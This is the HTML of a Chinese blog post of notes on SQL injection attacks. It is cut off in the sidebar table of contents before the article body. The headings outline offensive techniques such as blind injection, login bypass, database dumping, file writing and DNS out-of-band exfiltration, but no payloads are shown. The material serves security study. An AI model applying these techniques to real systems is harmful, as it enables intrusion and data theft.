<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/assets/images/favicon-package/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/images/favicon-package/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/favicon-package/favicon-16x16.png">
  <link rel="mask-icon" href="/assets/images/favicon-package/safari-pinned-tab.svg" color="#222">
  <link rel="manifest" href="/assets/images/favicon-package/site.webmanifest">
  <meta name="google-site-verification" content="qIz-Tg08U6gyN_53z89yii0ZmKx2avfsO-iyOWhsRx8">
  <meta name="msvalidate.01" content="096F3D01D2AA04148F10750CD4566535">
  <meta name="yandex-verification" content="43f790b7e38394a4">
  <meta name="baidu-site-verification" content="codeva-LMZoUaXjJl">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="/lib/@fortawesome/fontawesome-free/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
  <link rel="stylesheet" href="/lib/animate.css/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"loli.fj.cn","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.23.2","exturl":false,"sidebar":{"position":"right","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-light","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":true},"bookmark":{"enable":true,"color":"#222","save":"manual"},"mediumzoom":true,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":true}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="前言SQL注入（英语：SQL injection），也称SQL注入或SQL注码，是发生于应用程序与数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了字符检查，那么这些注入进去的恶意指令就会被数据库服务器误认为是正常的SQL指令而执行，因此遭到破坏或是入侵。（维基百科）">
<meta property="og:type" content="article">
<meta property="og:title" content="【笔记】SQL注入攻击">
<meta property="og:url" content="https://loli.fj.cn/2020/03/27/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/index.html">
<meta property="og:site_name" content="57uv6Z6g55qE5Y2a5a6i">
<meta property="og:description" content="前言SQL注入（英语：SQL injection），也称SQL注入或SQL注码，是发生于应用程序与数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了字符检查，那么这些注入进去的恶意指令就会被数据库服务器误认为是正常的SQL指令而执行，因此遭到破坏或是入侵。（维基百科）">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2020-03-27T15:46:23.000Z">
<meta property="article:modified_time" content="2025-10-25T07:39:44.917Z">
<meta property="article:author" content="57uv6Z6g">
<meta property="article:tag" content="MySQL">
<meta property="article:tag" content="WebVulnerabilities">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://loli.fj.cn/2020/03/27/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://loli.fj.cn/2020/03/27/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/","path":"2020/03/27/SQL注入攻击/","title":"【笔记】SQL注入攻击"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>【笔记】SQL注入攻击 | 57uv6Z6g55qE5Y2a5a6i</title>
  






  <script async defer data-website-id="981ed5a0-eea5-4426-a8a9-c16a789ccc3f" src="https://umami.loli.fj.cn/script.js" data-host-url="https://umami.loli.fj.cn/"></script>


  
  <script src="/lib/animejs/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
  <script src="/lib/@next-theme/pjax/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous" defer></script>
  <script src="/lib/medium-zoom/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous" defer></script>
  <script src="/lib/pangu/dist/browser/pangu.umd.js" integrity="sha256-erngBMP3zzoIM6eqQ8dmrReh2vqCRgWmORroIfVoDlE=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script><script src="/js/pjax.js" defer></script>

  <script src="/lib/hexo-generator-searchdb/dist/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>







  
  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




  

  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"/lib/mathjax/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js" defer></script>



  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="57uv6Z6g55qE5Y2a5a6i" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">57uv6Z6g55qE5Y2a5a6i</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">MS4wLjABAAAA5qMD8Gzdcgq7HXUOviKB59i0-ybJ59jJvNzyaPt5XOsVNqP6DU7WLcoAXvdxvYdp💗<br><font color="red">本站所有文章仅作技术研究，请勿非法破坏，请遵守相关法律法规，后果自负</font></p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-reward"><a href="/reward/" rel="section"><i class="fa fa-hand-holding-heart fa-fw"></i>赞助</a></li><li class="menu-item menu-item-command"><a href="/command/" rel="section"><i class="fa fa-book fa-fw"></i>指令</a></li><li class="menu-item menu-item-contribute"><a href="/contribute/" rel="section"><i class="fa fa-chart-line fa-fw"></i>贡献</a></li><li class="menu-item menu-item-rss"><a href="/atom.xml" rel="section"><i class="fa fa-rss fa-fw"></i>订阅</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

<link rel="manifest" href="/assets/images/favicon-package/site.webmanifest">

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B9%E6%8D%AE%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%88%86%E7%B1%BB"><span class="nav-number">3.1.</span> <span class="nav-text">根据数据类型分类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B9%E6%8D%AE%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95%E7%9A%84%E5%88%86%E7%B1%BB"><span class="nav-number">3.2.</span> <span class="nav-text">根据注入手法的分类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B9%E6%8D%AE%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E7%9A%84%E5%88%86%E7%B1%BB%EF%BC%88GPC%EF%BC%89"><span class="nav-number">3.3.</span> <span class="nav-text">根据注入原理的分类（GPC）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E4%BD%8D%E7%BD%AE"><span class="nav-number">3.4.</span> <span class="nav-text">注入点位置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5"><span class="nav-number">3.4.1.</span> <span class="nav-text">参数注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="nav-number">3.4.2.</span> <span class="nav-text">请求头注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#XFF%E6%B3%A8%E5%85%A5"><span class="nav-number">3.4.2.1.</span> <span class="nav-text">XFF注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E6%B5%8B%E8%AF%95"><span class="nav-number">3.5.</span> <span class="nav-text">数据类型测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%93%E6%96%AD%E6%B5%8B%E8%AF%95"><span class="nav-number">3.6.</span> <span class="nav-text">打断测试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B5%8B%E8%AF%95"><span class="nav-number">3.6.1.</span> <span class="nav-text">宽字节测试</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95%E6%B5%8B%E8%AF%95"><span class="nav-number">3.7.</span> <span class="nav-text">注入手法测试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%AD%98%E5%9C%A8%E6%B5%8B%E8%AF%95"><span class="nav-number">3.7.1.</span> <span class="nav-text">注入点存在测试</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E7%BB%93%E8%AE%BA"><span class="nav-number">3.7.1.1.</span> <span class="nav-text">测试结论</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E6%B5%8B%E8%AF%95"><span class="nav-number">3.7.2.</span> <span class="nav-text">布尔测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BB%B6%E6%97%B6%E6%B5%8B%E8%AF%95"><span class="nav-number">3.7.3.</span> <span class="nav-text">延时测试</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%93%E4%BB%A3%E7%A0%81%E4%B8%AD%E5%87%BA%E7%8E%B0%E4%BA%86%E7%BC%96%E7%A0%81"><span class="nav-number">3.8.</span> <span class="nav-text">当代码中出现了编码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%82%E6%9E%9C%E6%98%AFGBK%E7%BC%96%E7%A0%81"><span class="nav-number">3.8.1.</span> <span class="nav-text">如果是GBK编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#base64%E6%B3%A8%E5%85%A5"><span class="nav-number">3.8.2.</span> <span class="nav-text">base64注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MySQL%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="nav-number">4.</span> <span class="nav-text">MySQL渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-number">4.1.</span> <span class="nav-text">联合查询注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E4%B8%AA%E6%95%B0%E6%B5%8B%E8%AF%95"><span class="nav-number">4.1.1.</span> <span class="nav-text">注入点个数测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E4%BD%8D%E7%BD%AE%E6%B5%8B%E8%AF%95"><span class="nav-number">4.1.2.</span> <span class="nav-text">注入点位置测试</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8"><span class="nav-number">4.2.</span> <span class="nav-text">盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E5%BB%B6%E6%97%B6%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">4.2.1.</span> <span class="nav-text">基于延时的盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%8C%9C%E6%B5%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6"><span class="nav-number">4.2.1.1.</span> <span class="nav-text">猜测数据库名长度</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">4.2.2.</span> <span class="nav-text">基于布尔的盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%8C%9C%E6%B5%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6-1"><span class="nav-number">4.2.2.1.</span> <span class="nav-text">猜测数据库名长度</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%8C%9C%E6%B5%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E6%AF%8F%E4%B8%AA%E5%AD%97%E7%AC%A6%E7%9A%84ascii%E7%A0%81"><span class="nav-number">4.2.2.2.</span> <span class="nav-text">猜测数据库名每个字符的ascii码</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">4.2.3.</span> <span class="nav-text">基于报错的盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%87%8D%E5%A4%8D%E9%94%AE%E5%86%B2%E7%AA%81%E6%8A%A5%E9%94%99"><span class="nav-number">4.2.3.1.</span> <span class="nav-text">重复键冲突报错</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%B8%8D%E5%90%8C%E7%9A%84SQL%E8%AF%AD%E5%8F%A5%E6%9E%84%E9%80%A0%E6%96%B9%E5%BC%8F"><span class="nav-number">4.2.3.1.1.</span> <span class="nav-text">不同的SQL语句构造方式</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#XPATH%E6%8A%A5%E9%94%99"><span class="nav-number">4.2.3.2.</span> <span class="nav-text">XPATH报错</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BB%E5%BD%95%E6%A1%86%E6%B3%A8%E5%85%A5"><span class="nav-number">4.3.</span> <span class="nav-text">登录框注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="nav-number">4.3.1.</span> <span class="nav-text">万能密码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cookie%E6%B3%A8%E5%85%A5"><span class="nav-number">4.4.</span> <span class="nav-text">cookie注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E4%BD%8D%E7%BD%AE%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="nav-number">4.5.</span> <span class="nav-text">其他位置的注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#User-Agent%E6%B3%A8%E5%85%A5"><span class="nav-number">4.5.1.</span> <span class="nav-text">User-Agent注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Referer%E6%B3%A8%E5%85%A5"><span class="nav-number">4.5.2.</span> <span class="nav-text">Referer注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.6.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC"><span class="nav-number">4.6.1.</span> <span class="nav-text">获取数据库版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E5%90%8D"><span class="nav-number">4.6.2.</span> <span class="nav-text">获取当前用户名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="nav-number">4.6.3.</span> <span class="nav-text">获取操作系统</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%B1%E5%BA%93"><span class="nav-number">4.7.</span> <span class="nav-text">脱库</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-number">4.7.1.</span> <span class="nav-text">获取数据库名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D"><span class="nav-number">4.7.2.</span> <span class="nav-text">获取数据表名</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">4.7.2.1.</span> <span class="nav-text">绕过</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="nav-number">4.7.3.</span> <span class="nav-text">获取字段名</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-1"><span class="nav-number">4.7.3.1.</span> <span class="nav-text">绕过</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="nav-number">4.7.4.</span> <span class="nav-text">获取数据</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-2"><span class="nav-number">4.7.4.1.</span> <span class="nav-text">绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"><span class="nav-number">4.8.</span> <span class="nav-text">文件读写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E6%98%AF%E5%90%A6%E5%85%B7%E6%9C%89%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%9D%83%E9%99%90"><span class="nav-number">4.8.1.</span> <span class="nav-text">检测当前用户是否具有文件读写权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">4.8.2.</span> <span class="nav-text">文件读取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="nav-number">4.8.3.</span> <span class="nav-text">文件写入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">4.9.</span> <span class="nav-text">堆叠注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">4.10.</span> <span class="nav-text">二次注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS%E5%B8%A6%E5%A4%96"><span class="nav-number">4.11.</span> <span class="nav-text">DNS带外</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Access%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="nav-number">5.</span> <span class="nav-text">Access渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5-1"><span class="nav-number">5.1.</span> <span class="nav-text">联合查询注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5"><span class="nav-number">5.2.</span> <span class="nav-text">偏移注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PostgreSQL%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="nav-number">6.</span> <span class="nav-text">PostgreSQL渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5-2"><span class="nav-number">6.1.</span> <span class="nav-text">联合查询注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E4%B8%AA%E6%95%B0%E6%B5%8B%E8%AF%95-1"><span class="nav-number">6.1.1.</span> <span class="nav-text">注入点个数测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E4%BD%8D%E7%BD%AE%E6%B5%8B%E8%AF%95-1"><span class="nav-number">6.1.2.</span> <span class="nav-text">注入点位置测试</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="nav-number">6.2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC-1"><span class="nav-number">6.2.1.</span> <span class="nav-text">获取数据库版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E5%90%8D-1"><span class="nav-number">6.2.2.</span> <span class="nav-text">获取当前用户名</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%B1%E5%BA%93-1"><span class="nav-number">6.3.</span> <span class="nav-text">脱库</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-1"><span class="nav-number">6.3.1.</span> <span class="nav-text">获取数据库名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-2"><span class="nav-number">6.3.2.</span> <span class="nav-text">获取数据库名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D-1"><span class="nav-number">6.3.3.</span> <span class="nav-text">获取数据表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D-1"><span class="nav-number">6.3.4.</span> <span class="nav-text">获取字段名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE-1"><span class="nav-number">6.3.5.</span> <span class="nav-text">获取数据</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2DBA%E7%94%A8%E6%88%B7%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D"><span class="nav-number">6.4.</span> <span class="nav-text">查询DBA用户的用户名</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLServer%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="nav-number">7.</span> <span class="nav-text">SQLServer渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5-3"><span class="nav-number">7.1.</span> <span class="nav-text">联合查询注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E4%B8%AA%E6%95%B0%E6%B5%8B%E8%AF%95-2"><span class="nav-number">7.1.1.</span> <span class="nav-text">注入点个数测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E4%BD%8D%E7%BD%AE%E6%B5%8B%E8%AF%95-2"><span class="nav-number">7.1.2.</span> <span class="nav-text">注入点位置测试</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2"><span class="nav-number">7.2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC-2"><span class="nav-number">7.2.1.</span> <span class="nav-text">获取数据库版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E5%90%8D-2"><span class="nav-number">7.2.2.</span> <span class="nav-text">获取当前用户名</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7"><span class="nav-number">7.2.2.1.</span> <span class="nav-text">当前数据库用户</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" 